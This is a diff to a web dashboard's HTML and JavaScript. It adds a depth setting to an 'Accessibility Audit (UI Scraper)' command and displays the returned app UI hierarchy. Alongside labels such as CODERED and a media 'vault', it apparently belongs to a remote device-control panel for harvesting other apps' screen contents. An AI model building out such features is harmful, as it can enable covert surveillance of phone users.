@@ -330,8 +330,9 @@
                     <label class="cmd-label">Accessibility Audit (UI Scraper)</label>
                     <div class="input-wrap">
                         <button class="btn-status" onclick="auditCmd('GET_TREE')">?</button>
-                        <input type="text" id="tree-pkg" placeholder="Package (null for all)">
-                        <input type="number" id="tree-dur" value="1" placeholder="Mins" style="width:80px">
+                        <input type="text" id="tree-pkg" placeholder="Package (null for all)" style="flex:1">
+                        <input type="number" id="tree-dur" value="1" title="Duration (Mins)" style="width:50px">
+                        <input type="number" id="tree-depth" value="10" title="Walk Depth" style="width:50px">
                         <button class="btn" onclick="sendCmd('GET_TREE')">Audit</button>
                     </div>
                 </div>
@@ -676,7 +677,8 @@
                     case 'GET_TREE':
                         const pkg = document.getElementById('tree-pkg').value || 'null';
                         const dur = document.getElementById('tree-dur').value || '5';
-                        content = `${pkg}|${dur}`; break;
+                        const depth = document.getElementById('tree-depth').value || '10';
+                        content = `${pkg}|${dur}|${depth}`; break;
                     case 'TOGGLE_FEATURE':
                         content = `${document.getElementById('tog-feat').value}:${document.getElementById('tog-state').value}:${document.getElementById('tog-dur').value}`; break;
                     case 'CODERED':
@@ -776,6 +778,17 @@
                         <div style="color:#fff; font-size:0.7rem; font-weight:bold;">📸 MEDIA_READY</div>
                         <div style="font-size:0.75rem; color:#aaa; margin:5px 0;">${c.result_file_path ? c.result_file_path.split('/').pop() : 'Processing...'}</div>
                         <div onclick="switchTab('files')" style="color:var(--primary); cursor:pointer; font-size:0.7rem; text-decoration:underline;">OPEN IN VAULT</div>
+                    </div>`;
+                }
+
+                if (c.file_name === 'GET_TREE' && c.result_data && c.result_data.snapshot) {
+                    const snap = c.result_data.snapshot;
+                    dataHtml = `<div style="margin-top:10px; padding:10px; background:rgba(0,0,0,0.4); border:1px solid #333;">
+                        <div style="color:var(--primary); font-size:0.7rem; font-weight:bold; margin-bottom:8px;">UI_HIERARCHY_SNAPSHOT (DEPTH: ${c.result_data.depth_limit})</div>
+                        <div style="color:#fff; font-size:0.7rem; margin-bottom:10px;">APP: ${snap.package || 'UNKNOWN'}</div>
+                        <div style="max-height:400px; overflow:auto; font-size:0.65rem; color:var(--success);">
+                            <pre style="margin:0; white-space:pre-wrap;">${JSON.stringify(snap.tree || snap.error, null, 2)}</pre>
+                        </div>
                     </div>`;
                 }
 
